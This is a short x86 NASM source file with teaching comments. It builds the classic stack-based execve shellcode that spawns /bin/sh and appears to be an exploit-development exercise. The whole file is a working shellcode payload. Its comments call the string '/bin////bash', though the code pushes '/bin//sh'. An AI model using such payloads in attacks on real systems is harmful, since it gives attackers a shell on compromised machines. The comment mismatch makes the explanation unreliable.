; Filename: execve-stack.nasm
; Author: Kunal Pachauri
; Website: http://kunalpachauri.co.in
; Purpose: Execve Shellcode using Stack to execute /bin/sh

global _start
section .text

_start:
	; Since stack grows from High memory to low memory, we need to push the execve string we designed earlier in different order
	; Pushing Nulls in Stack
	xor eax, eax
	push eax

	; Now Pushing the '/bin////bash' in stack in reverse order using reverse.py script
	push 0x68732f2f
	push 0x6e69622f

	; Now we have /bin////bash null terminated in stack pointed by ESP
	; We want this value in EBX, so
	mov ebx, esp

	; Now, we need envp to be NULL, so pushing NULL in stack and moving that value in EDX 
	push eax
	; Now ESP points to NULL
	mov edx, esp

	; Now, for the second parameter argv -> it needs to point to location which points to /bin////bash which is pointed by EBX
	push ebx
	; Now, ESP Points to address that contains /bin////bash, so moving this to ECX
	mov ecx, esp

	; Lets perform syscall now for execve i.e 11
	mov al, 11
	int 0x80
